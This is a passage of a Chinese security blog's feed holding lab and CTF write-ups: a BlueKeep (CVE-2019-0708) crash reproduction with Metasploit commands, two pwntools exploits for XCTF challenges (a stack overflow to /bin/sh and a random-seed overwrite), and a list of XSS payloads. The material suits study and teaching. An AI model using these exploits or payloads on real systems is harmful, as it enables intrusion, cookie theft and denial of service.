title="后记"></a>后记</h3><p>在获取session时候我遇见了很多小问题导致我不能获取，比如win7应该是x86系统，比如win7的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了session.<br>虽然后来再整理wp的时候，win7系统由于自动更新，chrome119版本也升级了，后来再安装却死活安装不上去，差点升天……</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>exp太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的exp。</p><pre><code class="hljs">https://github.com/exodusintel/CVE-2019-5786 </code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前言：&lt;/p&gt;
&lt;p&gt;这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！&lt;/p&gt;
&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境</summary>
      
    
    
    
    
    <category term="chrome_bug" scheme="https://sinky.top/tags/chrome-bug/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708</title>
    <link href="https://sinky.top/2022/08/09/CVE-2019-0708/"/>
    <id>https://sinky.top/2022/08/09/CVE-2019-0708/</id>
    <published>2022-08-09T04:25:01.135Z</published>
    <updated>2022-08-09T04:22:13.980Z</updated>
    
    <content type="html"><![CDATA[<p>2019年5月14日爆出CVE-2019-0708漏洞，高危漏洞，影响范围较广，通过远程桌面端口3389，RDP协议进行攻击。</p><p>影响系统：windows 2003、windows 2008、windows 2008 R2、windows xp、win7</p><h1 id="蓝屏"><a href="#蓝屏" class="headerlink" title="蓝屏"></a>蓝屏</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：kali IP：192.168.119.128</p><p>靶机：win7 IP:192.168.119.139 (开放3389端口)</p><p>工具：RDP漏洞扫描工具、MSF</p><p>POC：<a href="https://github.com/n1xbyte/CVE-2019-0708">https://github.com/n1xbyte/CVE-2019-0708</a></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>nmap对win7端口扫描:</p><p><img src="https://i.loli.net/2020/07/13/Agj1dU2GY5JKZnW.png" alt="nmap扫描3389.PNG"></p><p>RDP工具在win7上扫描靶机:<code>0708detector.exe -t 192.168.119.139 -p 3389</code></p><p><img src="https://i.loli.net/2020/07/13/CwHJ1PRnel7cyu5.png" alt="漏扫工具扫描3389（win7自身）.PNG"></p><p>启动MSF<br>查找漏洞： <code>search 0708</code></p><p>利用漏洞扫描模块： <code>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code></p><p>查看参数： <code>show options</code></p><p>设置靶机IP： <code>set rhosts 192.168.119.139</code></p><p>运行：<code>run</code></p><h3 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h3><p>在kali中安装pip3,安装impacket库。下载poc。<br>切进目录CVE-2019-0708</p><p>开始攻击： <code>python3 crashpoc.py 192.168.119.139 64(系统类型)</code></p><p>攻击成功，win7变为蓝屏。</p><p><img src="https://i.loli.net/2020/07/13/UN9urvOaMQxEDoC.png" alt="win7蓝屏.PNG"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h4 id="RDP协议"><a href="#RDP协议" class="headerlink" title="RDP协议"></a>RDP协议</h4><p>RDP,远程显示协议。传输方式：tcp/ip。提供了客户和服务器之间的连接。映像会话。<br>基本层次结构：</p><ul><li>网络连接层：RDP协议建立在tcp/ip协议之上，由于传输的数据量比较大，因此在协议的底层首先定义一层网络连接层，它定义了一个完整的RDP数据逻辑包，以避免由于网络包长度过长而被分割使数据丢失。</li><li>ISO数据层：在网络连接层之上是ISO数据层，标识RDP数据的正常连接通信。</li><li>虚拟通道层：在ISO数据层之上，RDP协议定义一个虚拟通道层，用以拆分标示不同虚拟通道的数据，加快客户端处理速度，节省占用网络接口的时间。</li><li>加密解密层：在虚拟通道层之上，RDP定义一个数据加密解密层，此层用于对所有的功能数据进行加密解密处理。</li><li>功能数据层：在加密解密层之上是功能数据，画面信息，本地资源转换，声音数据，打印数据等所有的功能数据信息都在此层进行处理。另外，根据数据类型的不同，这些数据都有各自不同层次的分割，</li></ul><p>连接过程说明：</p><ul><li>客户端连接服务器</li><li>ISO数据层建立连接</li><li>发送初始协议相关信息，接收加密、解密秘钥</li><li>虚拟通道申请</li><li>加密形式发送客户端系统信息，同时验证加密协议</li><li>平台软件证书验证</li><li>各功能建立连接，各功能数据传输，功能实现。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;2019年5月14日爆出CVE-2019-0708漏洞，高危漏洞，影响范围较广，通过远程桌面端口3389，RDP协议进行攻击。&lt;/p&gt;
&lt;p&gt;影响系统：windows 2003、windows 2008、windows 2008 R2、windows xp、win7&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="windows漏洞" scheme="https://sinky.top/tags/windows%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-pwn-反应釜开关控制</title>
    <link href="https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/"/>
    <id>https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/</id>
    <published>2022-08-09T04:18:04.404Z</published>
    <updated>2022-08-11T14:19:42.897Z</updated>
    
    <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec:"></a>checksec:</h2><p><img src="https://i.loli.net/2020/07/15/3D5qjSLvGN2CJzT.png" alt="checksec.PNG"></p><ul><li>可以修改GOT表</li><li>可以通过一处的方式来更改程序运行流</li><li>堆栈不可执行</li><li>地址随机化未开启</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>IDA查看，发现有/bin/sh。</p><p><img src="https://i.loli.net/2020/07/15/wLf32ASzvt5brWm.png" alt="shell.PNG"></p><p>get函数可溢出，偏移由v5得0x200h+0x8h(偏移对齐)=0x208h</p><p><img src="https://i.loli.net/2020/07/15/9mZH7GCz2u8LJq5.png" alt="v5.PNG"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>exp:</p><p><code> from pwn import * r = remote('220.249.52.133',39331) elf = ELF('./control') shell_addr = 0x04005F6 payload = 'A'*0x208 + p64(shell_addr) r.sendline(payload) r.interactive()</code></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看了一下大佬的wp，结果原来是盲打题……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;checksec&quot;&gt;&lt;a href=&quot;#checksec&quot; class=&quot;headerlink&quot; title=&quot;checksec:&quot;&gt;&lt;/a&gt;checksec:&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/07/15/3D5q</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://sinky.top/tags/ctf/"/>
    
    <category term="pwn" scheme="https://sinky.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>有关XSS跨站脚本</title>
    <link href="https://sinky.top/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/"/>
    <id>https://sinky.top/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/</id>
    <published>2022-08-09T04:10:35.381Z</published>
    <updated>2022-08-09T04:10:16.791Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS-跨站脚本-原理与分类"><a href="#XSS-跨站脚本-原理与分类" class="headerlink" title="XSS(跨站脚本)原理与分类"></a>XSS(跨站脚本)原理与分类</h1><p>跨站脚本攻击XSS,为了不和层叠样式表的缩写混淆，故将跨站脚本攻击缩写为XSS,恶意攻击者往web页面里插入恶意script代码，当用户浏览页面时嵌入其中的script代码被执行，从而恶意攻击用户。</p><p>XSS攻击针对的是用户层面的攻击.</p><ul><li>反射型：交互的数据一般不会被存在数据库里，一次性，一般出现在查询页面等。</li><li>存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在留言板，注册等页面。</li><li>DOM型：不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性，也属于反射型。</li></ul><h1 id="XSS漏洞测试流程"><a href="#XSS漏洞测试流程" class="headerlink" title="XSS漏洞测试流程"></a>XSS漏洞测试流程</h1><p>1.在目标上找输入点，比如查询接口、留言板</p><p>2.输入一组“特殊字符（&gt;,’,”等）+唯一识别字符”，点击提交后，查看返回源码，看后端返回数据是否有处理。</p><p>3.通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的调教（构造闭合）</p><p>4.提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，成功执行证明存在xss漏洞。</p><h1 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h1><ul><li><code>&lt;script&gt;</code>：最直接的xss有效载荷，脚本标记可以引用外部的javascript代码，也可以将代码插入脚本标记中。</li></ul><figure class="highlight plaintext"><figcaption><span>src</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs <script">&lt;script&gt;alert("hack")&lt;/script&gt; #弹出hack<br>&lt;script&gt;alert(document.cookie)&lt;/script&gt; #弹出cookie<br></code></pre></td></tr></tbody></table></figure><ul><li><code>&lt;img&gt;</code>：<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert("hack")&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(/hack/)&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;  #弹出cookie<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(123)&gt;      注：对于数字，可以不用引号<br>&lt;img  <span class="hljs-attribute">src</span>=<span class="hljs-string">"javascript:alert("</span>XSS");"&gt;<br>&lt;img  <span class="hljs-attribute">dynsrc</span>=<span class="hljs-string">"javascript:alert('XSS')"</span>&gt;<br>&lt;img  <span class="hljs-attribute">lowsrc</span>=<span class="hljs-string">"javascript:alert('XSS')"</span>&gt;<br></code></pre></td></tr></tbody></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS-跨站脚本-原理与分类&quot;&gt;&lt;a href=&quot;#XSS-跨站脚本-原理与分类&quot; class=&quot;headerlink&quot; title=&quot;XSS(跨站脚本)原理与分类&quot;&gt;&lt;/a&gt;XSS(跨站脚本)原理与分类&lt;/h1&gt;&lt;p&gt;跨站脚本攻击XSS,为了不和层叠样式表的缩写</summary>
      
    
    
    
    
    <category term="XSS" scheme="https://sinky.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-dice_game</title>
    <link href="https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/"/>
    <id>https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/</id>
    <published>2022-08-09T04:08:11.395Z</published>
    <updated>2022-08-11T14:24:30.121Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Checksec"><a href="#0x01-Checksec" class="headerlink" title="0x01 Checksec"></a>0x01 Checksec</h2><p>linux下checksec查壳，开启了relro nx pie防护：</p><p><img src="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png" alt="pwn-checksec.PNG"></p><h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>IDA打开，主函数：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">55</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [rsp+37h] [rbp-19h]</span><br>  <span class="hljs-type">ssize_t</span> v6; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [rsp+4Ch] [rbp-4h]</span><br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>uLL);<br>  *(_QWORD *)seed = <span class="hljs-built_in">time</span>(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Welcome, let me know your name: "</span>, a2);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  v6 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x50</span>uLL);<br>  <span class="hljs-keyword">if</span> ( v6 &lt;= <span class="hljs-number">49</span> )<br>    buf[v6 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hi, %s. Let's play a game.\n"</span>, buf);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  <span class="hljs-built_in">srand</span>(seed[<span class="hljs-number">0</span>]);<br>  v8 = <span class="hljs-number">1</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Game %d/50\n"</span>, v8);<br>    v5 = <span class="hljs-built_in">sub_A20</span>();<br>    <span class="hljs-built_in">fflush</span>(stdout);<br>    <span class="hljs-keyword">if</span> ( v5 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( v5 )<br>    {<br>      <span class="hljs-keyword">if</span> ( v8 == <span class="hljs-number">50</span> )<br>      {<br>        <span class="hljs-built_in">sub_B28</span>(buf);<br>        <span class="hljs-keyword">break</span>;<br>      }<br>      ++v8;<br>    }<br>  }<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bye bye!"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">sub_B28</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [rsp+10h] [rbp-70h]</span><br>  FILE *stream; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congrats %s\n"</span>, a1);<br>  stream = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">"flag"</span>, <span class="hljs-string">"r"</span>);<br>  <span class="hljs-built_in">fgets</span>(&amp;s, <span class="hljs-number">100</span>, stream);<br>  <span class="hljs-built_in">puts</span>(&amp;s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">fflush</span>(stdout);<br>}<br></code></pre></td></tr></tbody></table></figure><p>在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。</p><p><img src="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png" alt="相差40.PNG"></p><p>随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉</p><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> ctypes import *<br><span class="hljs-attribute">p</span>=remote('220.249.52.133',34691)<br><span class="hljs-attribute">libc</span>=cdll.LoadLibrary("libc.so.6")<br>p.recv()<br><span class="hljs-attribute">payload</span>=0x40*'a'+p64(0)<br>p.sendline(payload)<br>a=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(50):<br>    a.append(libc.rand()%6+1)<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    p.recv()<br>    <span class="hljs-built_in">print</span>(p.recv())<br>    p.sendline(str(i))<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x01-Checksec&quot;&gt;&lt;a href=&quot;#0x01-Checksec&quot; class=&quot;headerlink&quot; title=&quot;0x01 Checksec&quot;&gt;&lt;/a&gt;0x01 Checksec&lt;/h2&gt;&lt;p&gt;linux下checksec查壳，开启了relro </summary>
      
    
    
    
    
    <category term="ctf" scheme="https://sinky.top/tags/ctf/"/>
    
    <category term="pwn" scheme="https://sinky.top/tags/pwn/"/>
    
  </entry>
  
</feed>
